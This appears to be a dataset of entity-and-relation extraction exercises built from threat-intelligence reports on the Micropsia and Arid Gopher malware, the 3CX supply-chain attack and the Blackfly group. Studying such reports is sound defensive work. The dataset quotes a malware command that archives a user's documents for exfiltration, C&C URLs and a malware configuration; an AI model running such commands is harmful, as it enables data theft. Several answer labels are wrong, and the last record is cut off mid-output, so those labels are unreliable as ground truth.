{"instruction": "On January 4, Micropsia was used to execute two unknown files, both named hostupbroker.exe, on a single computer from the folder: csidl_common_appdata\\hostupbroker\\hostupbroker.exe. This was immediately followed by the exfiltration of a RAR file: CSIDL_COMMON_APPDATA\\windowsupserv\\windowsupserv.exe -f CSIDL_COMMON_APPDATA\\windowspackages\\01-04-2023-15-13-39_getf.rar On January 9, Arid Gopher was used to execute two unknown files on a single computer: csidl_common_appdata\\teamviewrremoteservice\\teamviewrremoteservice.exe csidl_common_appdata\\embededmodeservice\\embededmodeservice.exe The last malicious activity occurred from January 12 onwards when Arid Gopher was used to execute the unknown file named localsecuritypolicy.exe every ten hours.", "input": null, "output": "Named Entities: (Micropsia, malware), (hostupbroker.exe, file), (windowsupserv.exe, file), (teamviewrremoteservice.exe, file), (embededmodeservice.exe, file), (Arid Gopher, malware), (localsecuritypolicy.exe, file)\nRelationships: (Micropsia, execute, hostupbroker.exe), (hostupbroker.exe, followed by, windowsupserv.exe), (Micropsia, execute, teamviewrremoteservice.exe), (Micropsia, execute, embededmodeservice.exe), (Arid Gopher, execute, localsecuritypolicy.exe)"}
{"instruction": "Micropsia \nVariants of the Micropsia backdoor used in these attacks appear to be slightly updated versions of those seen by other vendors. In this campaign, Micropsia was deployed using multiple file names and file paths: \ncsidl_common_appdata\\microsoft\\dotnet35\\microsoftdotnet35.exe \ncsidl_common_appdata\\microsoftservicesusermanual\\systempropertiesinternationaltime.exe \ncsidl_common_appdata\\systempropertiesinternationaltime\\systempropertiesinternationaltime.exe \ncsidl_common_appdata\\windowsnetworkmanager\\windowsnetworkmanager.exe \ncsidl_common_appdata\\windowsps\\windowsps.exe \nMicropsia is executed using WMI and its main purpose appears to be running secondary payloads for the attackers. These included: \nArid Gopher (file names: networkvirtualizationstartservice.exe, networkvirtualizationfiaservice.exe, networkvirtualizationseoservice.exe) \nReverse SOCKs Tunneler (aka Revsocks) (file name: windowsservicemanageav.exe) \nData Exfiltration Tool (file name: windowsupserv.exe) \nTwo unknown files, both named hostupbroker.exe \nUnknown file named windowspackages.exe \nIn addition to this, Micropsia has its own functionality, such as taking screenshots, keylogging, and archiving certain file types using WinRAR in preparation for data exfiltration: \n\"%PROGRAMDATA%\\Software Distributions\\WinRAR\\Rar.exe\" a -r -ep1 -v2500k -hp71012f4c6bdeeb73ae2e2196aa00bf59_d01247a1eaf1c24ffbc851e883e67f9b -ta2023-01-14 \"%PROGRAMDATA%\\Software Distributions\\Bdl\\LMth__C_2023-02-13 17-14-41\" \"%USERPROFILE%\\*.xls\" \"%USERPROFILE%\\*.xlsx\" \"%USERPROFILE%\\*.doc\" \"%USERPROFILE%\\*.docx\" \"%USERPROFILE%\\*.csv\" \"%USERPROFILE%\\*.pdf\" \"%USERPROFILE%\\*.ppt\" \"%USERPROFILE%\\*.pptx\" \"%USERPROFILE%\\*.odt\" \"%USERPROFILE%\\*.mdb\" \"%USERPROFILE%\\*.accdb\" \"%USERPROFILE%\\*.accde\" \"%USERPROFILE%\\*.txt\" \"%USERPROFILE%\\*.rtf\" \"%USERPROFILE%\\*.vcf\"", "input": null, "output": "Named Entities: (Micropsia, malware), (microsoftdotnet35.exe, file), (systempropertiesinternationaltime.exe, file), (systempropertiesinternationaltime.exe, file), (windowsnetworkmanager.exe, file), (Arid Gopher, malware), (networkvirtualizationstartservice.exe, file), (networkvirtualizationfiaservice.exe, file), (networkvirtualizationseoservice.exe, file), (Reverse SOCKs Tunneler, malware), (windowsservicemanageav.exe, file), (Data Exfiltration Tool, tool), (WinRAR, tool), (windowsupserv.exe, file), (hostupbroker.exe, file), (windowspackages.exe, file)\nRelationships: (Micropsia, deployed by, microsoftdotnet35.exe), (Micropsia, deployed by, systempropertiesinternationaltime.exe), (Micropsia, deployed by, systempropertiesinternationaltime.exe), (Micropsia, deployed by, windowsnetworkmanager.exe), (Micropsia, deployed by, windowsps.exe), (Micropsia, includes, Arid Gopher), (Arid Gopher, file, networkvirtualizationstartservice.exe), (Arid Gopher, file, networkvirtualizationfiaservice.exe), (Arid Gopher, file, networkvirtualizationseoservice.exe, file), (Micropsia, includes, Reverse SOCKs Tunneler), (Reverse SOCKs Tunneler, file, windowsservicemanageav.exe), (Micropsia, includes, Data Exfiltration Tool), (Data Exfiltration Tool, file, windowsupserv.exe), (Micropsia, includes, hostupbroker.exe), (Micropsia, includes, windowspackages.exe)"}
{"instruction": "Arid Gopher Unlike Micropsia, which is written in Delphi, Arid Gopher is written in Go. Versions of Arid Gopher used in this campaign contain the following embedded components: 7za.exe \u2013 A copy of the legitimate 7-Zip executable AttestationWmiProvider.exe \u2013 A tool that sets a \u201crun\u201d registry value ServiceHubIdentityHost.exe \u2013 A copy of legitimate Shortcut.exe executable from Optimum X Setup.env \u2013 Configuration file Arid Gopher was also used to launch the following unknown files: networkswitcherdatamodell.exe, localsecuritypolicy.exe, and networkuefidiagsbootserver.exe, in addition to being used to download and execute files obfuscated with PyArmor. When communicating with a C&C server, Arid Gopher registers a device on one path then connects to another path, likely to receive commands: Connects to: http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 79.133.51[.]134) - likely to register device Followed by: http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands Connects to: http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv (IP: 146.19.233[.]32) - likely to register device Followed by: http://salimafia[.]net/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC - likely to receive commands", "input": null, "output": "Named Entities: (Arid Gopher, malware), (Micropsia, malware), (Delphi, tool), (Go, tool), (7za.exe, file), (AttestationWmiProvider.exe, file), (ServiceHubIdentityHost.exe, file), (Shortcut.exe, file), (Setup.env, file), (networkswitcherdatamodell.exe, file), (localsecuritypolicy.exe, file), (networkuefidiagsbootserver.exe, file), (http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv, URL), (79.133.51[.]134, IP), (http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC, URL), (http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv, URL), (146.19.233[.]32, IP), (http://salimafia[.]net/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC, URL)\nRelationships: (Arid Gopher, written in, Go), (Arid Gopher, contains, 7za.exe), (Arid Gopher, contains, AttestationWmiProvider.exe), (Arid Gopher, contains, ServiceHubIdentityHost.exe), (Arid Gopher, contains, Shortcut.exe), (Arid Gopher, used to launch, networkswitcherdatamodell.exe), (Arid Gopher, used to launch, localsecuritypolicy.exe), (Arid Gopher, used to launch, networkuefidiagsbootserver.exe), (Arid Gopher, connects to, http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv), (http://jumpstartmail[.]com/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv, IP, 79.133.51[.]134), (Arid Gopher, follows, http://jumpstartmail[.]com/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC), (Arid Gopher, connects to, http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv), (http://salimafia[.]net/IURTIER3BNV4ER/DWL1RucGSj/4wwA7S8jQv, IP, 146.19.233[.]32), (Arid Gopher, follows, http://salimafia[.]net/IURTIER3BNV4ER/AJLUK9BI48/0L6W3CSBMC)"}
{"instruction": "Arid Gopher appears to be regularly updated and rewritten by the attackers, most likely in order to evade detection. One variant of the malware was radically different from previous versions seen with most of the distinctive code updated, so much so that there was not a single subroutine that contained identical distinctive code when compared with the previous version. Mantis appeared to be aggressively mutating the logic between variants, which is a time-intensive operation if done manually. Table 1. Commands supported by latest variant of Arid Gopher backdoor Command Description \"c\" Perhaps related to main.exC(\"cmd\") \"d\" Perhaps related to main.down2 \"s\" Perhaps related to main.OnDSH \"ci\" Perhaps related to main.deviceProperties \"ps\" Perhaps related to main.exC(\"powershell\") \"ra\" Perhaps related to main.RunAWithoutW \"sf\" Perhaps related to main.updateSettings \"sl\" Perhaps related to main.searchForLogs \"ua\" Perhaps related to main.updateApp \"ut\" Perhaps related to main.updateT \"pwnr\" Perhaps related to main.exCWithoutW(\"powershell\") \"rapp\" Perhaps related to main.restartApp", "input": null, "output": "Named Entities: (Arid Gopher, malware), (Mantis, malware)\nRelationships: No related relations."}
{"instruction": "\"gelog\" Perhaps related to main.upAppLogs \"ufbtt\" Perhaps related to main.collectFi \"ufofd\" Perhaps related to main.collectFiOrFol \"bwp\" Perhaps related to main.browDat \"cbh\" Perhaps related to main.delBD \"cwr\" Perhaps related to main.exCWithoutW(\"cmd\") \"gaf\" Perhaps related to main.collectFi \"ntf\" Perhaps related to main.collectNet \"smr\" Perhaps related to main.updateSettings The embedded setup.env file used by one analyzed variant of Arid Gopher to retrieve configuration data contained the following: DIR=WindowsPerceptionService ENDPOINT=http://jumpstartmail[.]com/IURTIER3BNV4ER LOGS=logs.txt DID=code.txt VER=6.1 EN=2 ST_METHOD=r ST_MACHINE=false ST_FLAGS=x COMPRESSOR=7za.exe DDIR=ResourcesFiles BW_TOO_ID=7463b9da-7606-11ed-a1eb-0242ac120002 SERVER_TOKEN=PDqMKZ91l2XDmDELOrKB STAPP=AttestationWmiProvider.exe SHORT_APP=ServiceHubIdentityHost.exe The setup.env configuration file mentions another file, AttestationWmiProvider.exe, which is also embedded in Arid Gopher. The file is a 32-bit executable that is used as a helper to ensure that another executable will run on reboot. When it executes, it checks for the following command-line arguments: \"key\" with string parameter [RUN_VALUE_NAME] \"value\" with string parameter [RUN_PATHNAME]", "input": null, "output": "Named Entities: (Arid Gopher, malware), (http://jumpstartmail[.]com, URL), (AttestationWmiProvider.exe, file), (ServiceHubIdentityHost.exe)\nRelationships: (Arid Gopher, endpoint, http://jumpstartmail[.]com), (Arid Gopher, stapp, AttestationWmiProvider.exe), (Arid Gopher, shortAPP, ServiceHubIdentityHost.exe), (AttestationWmiProvider.exe, embedded in, Arid Gopher)"}
{"instruction": "It then arranges to receive notification on a signal using func os/signal.Notify(). Once notified, it sets the following registry value: HKEY_CURRENT_USER\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\\"[RUN_VALUE_NAME]\" = \"[RUN_PATHNAME]\" Our investigation so far shows this file setting Arid Gopher to run on reboot: CSIDL_COMMON_APPDATA\\attestationwmiprovider\\attestationwmiprovider.exe -key=NetworkVirtualizationStartService \"-value=CSIDL_COMMON_APPDATA\\networkvirtualizationstartservice\\networkvirtualizationstartservice.exe -x\"", "input": null, "output": "Named Entities: (Arid Gopher, malware)\nRelationships: No related relations."}
{"instruction": "Exfiltration Tool \nThe attackers also used a custom tool to exfiltrate data stolen from targeted organizations: a 64-bit PyInstaller executable named WindowsUpServ.exe. When run, the tool checks for the following command-line arguments: \n\"-d\" \"[FILE_DIRECTORY]\" \n\"-f\" \"[FILENAME]\" \nFor each \"-f\" \"[FILENAME]\" command-line argument, the tool uploads the content of\u00a0[FILENAME]. For each \"-d\" \"[FILE_DIRECTORY]\" command-line argument, the tool obtains a list of files stored in the folder\u00a0[FILE_DIRECTORY]\u00a0and uploads the content of each file. \nWhen uploading each file, the tools sends an HTTP POST request to a C&C server with the following parameters: \n\"kjdfnqweb\":\u00a0[THE_FILE_CONTENT] \n\"qyiwekq\":\u00a0[HOSTNAME_OF_THE_AFFECTED_COMPUTER] \nWhenever the remote server responds with the status code 200, the malware deletes the uploaded file from the local disk. The malware may also log some of its actions in the following files: \n\"C:\\ProgramData\\WindowsUpServ\\success.txt\" \n\"C:\\ProgramData\\WindowsUpServ\\err.txt\"", "input": null, "output": "Named Entities:  (WindowsUpServ.exe, file), (success.txt, file), (err.txt, file)\nRelationships: (attacker, use, WindowsUpServ.exe), (malware, log, success.txt), (malware, log, err.txt)"}
{"instruction": "Determined Adversary \nMantis appears to be a determined adversary, willing to put time and effort into maximizing its chances of success, as evidenced by extensive malware rewriting and its decision to compartmentalize attacks against single organizations into multiple separate strands to reduce the chances of the entire operation being detected.", "input": null, "output": "Named Entities: (Mantis, attacker)\nRelationships: No related relations."}
{"instruction": "3CX: Supply Chain Attack Affects Thousands of Users Worldwide", "input": null, "output": "Named Entities: (3CX, tool), (Supply Chain Attack, threat type)\nRelationships: (3CX, for, Supply Chain Attack)"}
{"instruction": "North Korean-sponsored actors believed to be linked to attack that Trojanized several versions of 3CX DesktopApp UPDATE March 31 2023 14:26 UTC : Our blog has been updated with a Yara rule to detect the final infostealer payload. UPDATE March 30 2023 17:39 UTC : Our blog has been updated with technical analysis of the macOS versions. UPDATE March 30 2023 14:17 UTC : Our blog has been updated with additional IOCs UPDATE March 30 2023 12:47 UTC : Our blog has been updated with additional IOCs and protection information. UPDATE March 30 2023 9:07 UTC : Our blog has been updated with technical analysis of the malware used.", "input": null, "output": "Named Entities: (North Korean-sponsored actors, attacker), (3CX DesktopApp, tool)\nRelationships: (North Korean-sponsored actors, believed to be linked to, 3CX DesktopApp)"}
{"instruction": "Attackers believed to be linked to North Korea have Trojanized 3CX's DesktopApp, a widely-used voice and video calling desktop client. In an attack reminiscent of SolarWinds , installers for several recent Windows and Mac versions of the software were compromised and modified by the attackers in order to deliver additional information stealing malware to the user\u2019s computer. The information gathered by this malware presumably allowed the attackers to gauge if the victim was a candidate for further compromise.", "input": null, "output": "Named Entities: (3CX's DesktopApp, tool), (SolarWinds, malware)\nRelationships: No related relations."}
{"instruction": "The shellcode loads and executes this third DLL, export DLLGetClassObject with parameters: 1200 2400 \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) 3CXDesktopApp/18.11.1197 Chrome/102.0.5005.167 Electron/19.1.9 Safari/537.36\u201d It will then attempt to download an ICO file from the following GitHub repository: https://raw.githubusercontent[].com/IconStorages/images/main/icon%d.ico", "input": null, "output": "Named Entities: (https://raw.githubusercontent[].com/IconStorages/images/main/icon%d.ico, URL)\nRelationships: No related relations."}
{"instruction": "Mac versions \nAt last two macOS versions of the affected software were compromised in a similar fashion. In this case a dynamic library named libffmpeg.dylib was Trojanized. There are at least two variants of this file (SHA256: a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67 and fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7) and they seem to relate to different versions of the software. \nThe malicious code is in the InitFunc_0 function of libffmpeg.dylib, it calls _run_avcodec which starts a thread, in this thread it decodes some shellcode with XOR key 0x7A and then will make a http request. \nIt attempts to download a payload from: \nURL: https://msstorageazure[.]com/analysis \nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Safari/537.36 \nThe following URLs were embedded in analyzed variants: \nofficestoragebox[.]com/api/biosync \nvisualstudiofactory[.]com/groupcore \nazuredeploystore[.]com/cloud/images \nmsstorageboxes[.]com/xbox \nofficeaddons[.]com/quality \nsourceslabs[.]com/status \nzacharryblogs[.]com/xmlquery \npbxcloudeservices[.]com/network \npbxphonenetwork[.]com/phone \nakamaitechcloudservices[.]com/v2/fileapi \nazureonlinestorage[.]com/google/storage \nmsedgepackageinfo[.]com/ms-webview \nglcloudservice[.]com/v1/status \npbxsources[.]com/queue", "input": null, "output": "Named Entities: (libffmpeg.dylib, file), (a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67, SHA256), (fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7, SHA256), (https://msstorageazure[.]com/analysis, URL), (officestoragebox[.]com/api/biosync, URL), (visualstudiofactory[.]com/groupcore, URL), (azuredeploystore[.]com/cloud/images, URL), (msstorageboxes[.]com/xbox, URL), (officeaddons[.]com/quality, URL), (sourceslabs[.]com/status, URL), (zacharryblogs[.]com/xmlquery, URL), (pbxcloudeservices[.]com/network, URL), (pbxphonenetwork[.]com/phone, URL), (akamaitechcloudservices[.]com/v2/fileapi, URL), (azureonlinestorage[.]com/google/storage, URL), (msedgepackageinfo[.]com/ms-webview, URL), (glcloudservice[.]com/v1/status, URL), (pbxsources[.]com/queue, URL)\nRelationships: (libffmpeg.dylib, hash, a64fa9f1c76457ecc58402142a8728ce34ccba378c17318b3340083eeb7acc67), (libffmpeg.dylib, hash, fee4f9dabc094df24d83ec1a8c4e4ff573e5d9973caa676f58086c99561382d7), (libffmpeg.dylib, download payload from, https://msstorageazure[.]com/analysis), (variants, embed, officestoragebox[.]com/api/biosync), (variants, embed, visualstudiofactory[.]com/groupcore), (variants, embed, azuredeploystore[.]com/cloud/images), (variants, embed, msstorageboxes[.]com/xbox), (variants, embed, officeaddons[.]com/quality), (variants, embed, sourceslabs[.]com/status), (variants, embed, zacharryblogs[.]com/xmlquery), (variants, embed, pbxcloudeservices[.]com/network), (variants, embed, pbxphonenetwork[.]com/phone), (variants, embed, akamaitechcloudservices[.]com/v2/fileapi), (variants, embed, azureonlinestorage[.]com/google/storage), (variants, embed, msedgepackageinfo[.]com/ms-webview), (variants, embed,glcloudservice[.]com/v1/status), (variants, embed, pbxsources[.]com/queue)"}
{"instruction": "Mitigation \n3CX is aware of the compromise and is advising users to immediately uninstall the app. It said that it is working on an update to the software that will be released within hours. It advised users to consider using its PWA client as an alternative until a clean version of DesktopApp\u00a0is released.", "input": null, "output": "Named Entities: (3CX, tool), (DesktopApp, tool)\nRelationships: No related relations."}
{"instruction": "$a3 = { 7B 00 22 00 48 00 6F 00 73 00 74 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 44 00 6F 00 6D 00 61 00 69 00 6E 00 4E 00 61 00 6D 00 65 00 22 00 3A 00 20 00 22 00 25 00 73 00 22 00 2C 00 20 00 22 00 4F 00 73 00 56 00 65 00 72 00 73 00 69 00 6F 00 6E 00 22 00 3A 00 20 00 22 00 25 00 64 00 2E 00 25 00 64 00 2E 00 25 00 64 00 22 00 7D } $b1 = \"HostName: %s\" wide fullword $b2 = \"DomainName: %s\" wide fullword $b3 = \"OsVersion: %d.%d.%d\" wide fullword", "input": null, "output": "No related named entities and relations."}
{"instruction": "$b4 = \"%s.old\" wide fullword condition: 3 of ($a*) and 2 of ($b*) } For more information on scanning SEP client computers using custom Yara rules, read this knowledge base article .", "input": null, "output": "No related named entities and relations."}
{"instruction": "Blackfly: Espionage Group Targets Materials Technology", "input": null, "output": "Named Entities: (Blackfly, attacker)\nRelationships: No related relations."}
{"instruction": "Group targets multiple subsidiaries of single Asian conglomerate. \nThe Blackfly espionage group (aka APT41, Winnti Group, Bronze Atlas) has continued to mount attacks against targets in Asia and recently targeted two subsidiaries of an Asian conglomerate, both of which operate in the materials and composites sector, suggesting that the group may be attempting to steal intellectual property.", "input": null, "output": "Named Entities: (Blackfly, attacker), (APT41, attacker), (Winnti Group, attacker), (Bronze Atlas, attacker)\nRelationships: (Blackfly, aka, APT41), (Blackfly, aka, Winnti Groupe), (Blackfly, aka, Bronze Atlas)"}
{"instruction": "Current Blackfly toolset The following tools were used in attacks during late 2022 and early 2023: Backdoor.Winnkit SHA256: caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459 SHA256: cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a SHA256: e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596 SHA256: a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac SHA256: 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196 SHA256: 192ef0dee8df73eec9ee617abe4b0104799f9543a22a41e28d4d44c3ad713284 Rootkit driver known to be associated with Blackfly Credential-dumping tool SHA256: 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c Creates a dump of credentials from lsass.exe in C:\\windows\\temp\\1.bin. Screenshotting tool SHA256: 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4 Screenshots all open windows and saves them as .jpg files. Process-hollowing tool SHA256: 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e Injects shellcode in C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted. The shellcode is a simple \"Hello World\" alert message. SQL tool SHA256: 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d SQL client tool used to query SQL databases. Mimikatz SHA256: b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c Publicly available credential-dumping tool. ForkPlayground SHA256: a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864 Proof-of-Concept application to create a memory dump of an arbitrary process using the ForkLib. Proxy configuration tool SHA256: 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f SHA256: d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee SHA256: f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f Configures proxy settings by injecting into: C:\\Windows\\system32\\svchost.exe -k LocalSystemNetworkRestricted.", "input": null, "output": "Named Entities: (Blackfly, tool), (Backdoor.Winnkit, malware), (caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459, SHA256), (cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a, SHA256), (e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596, SHA256), (a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac, SHA256), (714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196, SHA256), (Rootkit driver, tool), (Blackfly, associated with, Rootkit driver), (Credential-dumping tool, tool), ( 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c, SHA256), (Screenshotting tool, tool), ( 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4, SHA256), (Process-hollowing tool, tool), ( 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e, SHA256), (SQL tool, tool), ( 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d, SHA256), (Mimikatz, tool), ( b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c, SHA256), (ForkPlayground, tool), ( a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864, SHA256), (Proxy configuration tool, tool), ( 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f, SHA256), ( d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee, SHA256), ( f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f, SHA256)\n\nRelationships: (Blackfly, use, Backdoor.Winnkit), (Backdoor.Winnkit, hash, caba1085791d13172b1bb5aca25616010349ecce17564a00cb1d89c7158d6459), (Backdoor.Winnkit, hash, cf6bcd3a62720f0e26e1880fe7ac9ca6c62f7f05f1f68b8fe59a4eb47377880a), (Backdoor.Winnkit, hash, e1e0b887b68307ed192d393e886d8b982e4a2fd232ee13c2f20cd05f91358596), (Backdoor.Winnkit, hash, a3078d0c4c564f5efb1460e7d341981282f637d38048501221125756bc740aac), (Backdoor.Winnkit, hash, 714cef77c92b1d909972580ec7602b0914f30e32c09a5e8cb9cb4d32aa2a2196), (Blackfly, use, Rootkit driver), (Rootkit driver, associated with, Blackfly), (Blackfly, use, Credential-dumping tool), (Credential-dumping tool, hash, 100cad54c1f54126b9d37eb8c9e426cb609fc0eda0e9a241c2c9fd5a3a01ad6c), (Blackfly, use, Screenshotting tool), (Screenshotting tool, hash, 452d08d420a8d564ff5df6f6a91521887f8b9141d96c77a423ac7fc9c28e07e4), (Blackfly, use, Process-hollowing tool), (Process-hollowing tool, hash, 1cc838896fbaf7c1996198309fbf273c058b796cd2ac1ba7a46bee6df606900e), (Blackfly, use, SQL tool), (SQL tool, hash, 4ae2cb9454077300151e701e6ac4e4d26dc72227135651e02437902ac05aa80d), (Blackfly, use, Mimikatz), (Mimikatz, hash, b28456a0252f4cd308dfb84eeaa14b713d86ba30c4b9ca8d87ba3e592fd27f1c), (Blackfly, use, ForkPlayground), (ForkPlayground, hash, a3acb9f79647f813671c1a21097a51836b0b95397ebc9cd178bc806e1773c864), (Blackfly, use, Proxy configuration tool), (Proxy configuration tool, hash, 5e51bdf067e5781d2868d97e7608187d2fec423856dbc883c6f81a9746e99b9f), (Proxy configuration tool, hash, d4e1f09cb7b9b03b4779c87f2a10d379f1dd010a9686d221c3a9f45bda5655ee), (Proxy configuration tool, hash, f138d785d494b8ff12d4a57db94958131f61c76d5d2c4d387b343a213b29d18f)"}
{"instruction": "Proxy configuration tool SHA256: 88113bebc49d40c0aa1f1f0b10a7e6e71e4ed3ae595362451bd9dcebcf7f8bf4 SHA256: 498e8d231f97c037909662764397e02f67d0ee16b4f6744cf923f4de3b522bc1 This tool requires a file called conf.dat to run properly, located at: c:\\users\\public\\conf.dat. Conf.dat contains the configuration to set up proxy settings.", "input": null, "output": "Named Entities: (Proxy configuration tool, tool), (88113bebc49d40c0aa1f1f0b10a7e6e71e4ed3ae595362451bd9dcebcf7f8bf4, SHA256), (498e8d231f97c037909662764397e02f67d0ee16b4f6744cf923f4de3b522bc1, SHA256), (conf.dat, file)\nRelationships: (Proxy configuration tool, hash, 88113bebc49d40c0aa1f1f0b10a7e6e71e4ed3ae595362451bd9dcebcf7f8bf4), (Proxy configuration tool, hash, 498e8d231f97c037909662764397e02f67d0ee16b4f6744cf923f4de3b522bc1), (Proxy configuration tool, requrie, conf.dat)"}
{"instruction": "Longstanding APT group Blackfly is one of the longest known Chinese advanced persistent threat (APT) groups, active since at least 2010. Early attacks were distinguished by the use of the PlugX/Fast (Backdoor.Korplug), Winnti/Pasteboy (Backdoor.Winnti), and Shadowpad (Backdoor.Shadowpad) malware families. The group initially made a name for itself through attacks on the computer gaming industry. It subsequently branched out into targeting a more diverse range of targets, including organizations in the semiconductor, telecoms, materials manufacturing, pharmaceutical, media and advertising, hospitality, natural resources, fintech, and food sectors.", "input": null, "output": "Named Entities: (Blackfly, attacker), (APT, threat type), (PlugX/Fast, malware), (Backdoor.Korplug, malware), (Winnti/Pasteboy, malware), (Backdoor.Winnti, malware), (Shadowpad, malware), (Backdoor.Shadowpad, malware)\nRelationships: (Blackfly, for, APT), (Blackfly, use, PlugX/Fast), (PlugX/Fast, is, Backdoor.Korplug), (Blackfly, use, Winnti/Pasteboy), (Winnti/Pasteboy, is, Backdoor.Winnti), (Blackfly, use, Shadowpad), (Shadowpad, is, Backdoor.Shadowpad)"}
{"instruction": "\"-port\", \"-removetcpview\", \"-tcpview\", \"-clearall\", \"-clear\", \"-transport\", \"-waitport\", \"-kill\", \"-antiscan\", \"-removeprocessnotify\", \"-setprocessnotify\", \"-antiantigp\", \"-hideproc\", \"-hidekey\", \"-hidefile\", \"-setprotect\", Any other values result in what looks like a buggy dwIoControlCode value. The second argument is a string to pass as an lpInBuffer parameter when calling the DeviceIoControl API, after conversion using the MultiByteToWideChar API. Export \"DoRVA\" Whenever the export \"DoRVA\" is executed, it reads the following file: \"[file_directory_of_the_DLL]\\Form.hlp\" The file should start with the magic string \"AP32\" and contains shellcode to execute in compressed form. Export \"KillAvpProcess\" This enumerates running processes and for selected processes and calls its own export \"CallDriver\" with the following parameters: first parameter: \"-kill\" second parameter: \"[ProcessID]\" The export expects a single string parameter to compare with the executable file of running processes for selection. Export \"ProtectDllFile\" This calls its own export \"CallDriver\" with the following parameters: first parameter: \"-file\" second parameter: \"[file_path_of_the_DLL]\"", "input": null, "output": "No related entities and relations."}
{"instruction": "Attack chain The attackers compromised installer files for at least two Windows versions (18.12.407 and 18.12.416) and two Mac versions (8.11.1213 and latest) of 3CX DesktopApp. The installers contained clean versions of the app along with malicious DLLs. The app was used to sideload the malicious DLLs, which then installed information-stealing malware on the computer. In two variants analyzed by Symantec (SHA256: aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868 and 59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983), the clean executable was used to load a malicious DLL named ffmpeg.dll (SHA256: 7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896) This DLL contains code that will load and execute a payload from a second DLL named d3dcompiler_47.dll. (SHA256: 11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03) D3dcompiler_47.dll contains an encrypted blob appended to the file, suggesting that it is possibly a Trojanized version of a legitimate file. The blob starts with the hex value \u201cFEEDFACE\u201d which the loader uses to find the blob. The decrypted blob contains shellcode and a third DLL (SHA256: aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973).", "input": null, "output": "Named Entities: (3CX DesktopApp, tool), (aa124a4b4df12b34e74ee7f6c683b2ebec4ce9a8edcf9be345823b4fdcf5d868, SHA256), (59e1edf4d82fae4978e97512b0331b7eb21dd4b838b850ba46794d9c7a2c0983, SHA256), (ffmpeg.dll, file), (7986bbaee8940da11ce089383521ab420c443ab7b15ed42aed91fd31ce833896, SHA256), (d3dcompiler_47.dll, file), (11be1803e2e307b647a8a7e02d128335c448ff741bf06bf52b332e0bbf423b03, SHA256), (Trojan, threat type), (aa4e398b3bd8645016d8090ffc77d15f926a8e69258642191deb4e68688ff973, SHA256), (5D41402ABC4B2A76B9719D911017C592, SHA256)\nRelationships: (attackers, compromise, 3CX DesktopApp), 